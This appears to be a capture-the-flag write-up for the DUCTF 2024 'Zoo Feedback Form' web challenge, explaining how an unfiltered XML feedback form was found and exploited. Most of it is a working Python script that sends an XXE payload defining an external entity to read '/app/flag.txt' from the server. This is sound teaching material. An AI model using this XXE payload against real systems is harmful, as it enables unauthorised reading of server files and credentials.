---
title: Down Under CTF (DUCTF) 2024 Zoo Feedback Form
draft: false
tags:
  - ctf
  - web-exploitation
  - xxe
---

# Zoo Feedback Form

The webpage is a simple feedback form with only one input field. Upon clicking "Submit Feedback", a POST request is sent:

```xml
<?xml version="1.0" encoding="UTF-8"?>
            <root>
                <feedback>a</feedback>
            </root>
```

with a response of:

```
Feedback sent to the Emus: a
```

Testing around, we can determine that the form is unfiltered. For example, sending `<` yields an XML parsing error about `invalid element name`. Thus, this form is vulnerable to XXE (XML External Entity) injection. Specifically, we can use the `<!ENTITY>` directive to read the contents of files on the server (along with other possibilities, but for getting the flag, this is all we need).

```python
import requests

url = 'https://web-zoo-feedback-form-2af9cc09a15e.2024.ductf.dev/'

headers = {
    'Content-Type': 'application/xml'

}

payload = """
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///app/flag.txt"> ]>
<root>
    <feedback>&xxe;</feedback>
</root>
"""

response = requests.post(url, data=payload, headers=headers)
print(response.text)
```

This script sends a POST request with the payload containing the `<!ENTITY>` directive to read the contents of `flag.txt`. The response contains the flag!